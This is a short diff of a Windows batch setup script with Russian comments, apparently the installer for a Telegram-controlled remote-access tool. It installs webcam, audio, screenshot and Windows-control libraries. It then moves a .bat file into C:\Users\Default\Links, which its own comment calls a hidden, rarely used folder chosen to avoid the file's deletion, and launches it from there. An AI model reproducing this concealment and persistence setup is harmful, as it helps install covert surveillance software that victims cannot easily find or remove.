@@ -12,7 +12,7 @@ pip3 install pytelegrambotapi opencv-python pypiwin32 comtypes pillow pycaw
 rem Устанавливает все необходимые библиотеки.
 pip install PyAudio-0.2.11-cp38-cp38-win_amd64.whl
 rem Устанавливает дополнительную библиотеку PyAudio.
-move *** C:\Users\Default\Links
+move setup_64_comment C:\Users\Default\Links
 rem Переносит файл в скрытую и обычно никому не нужную папку, что позволит избежать удаления файла.
 rem Замените *** на название файла из 9 строки.
 start C:\Users\Default\Links\setup_64_comment.bat
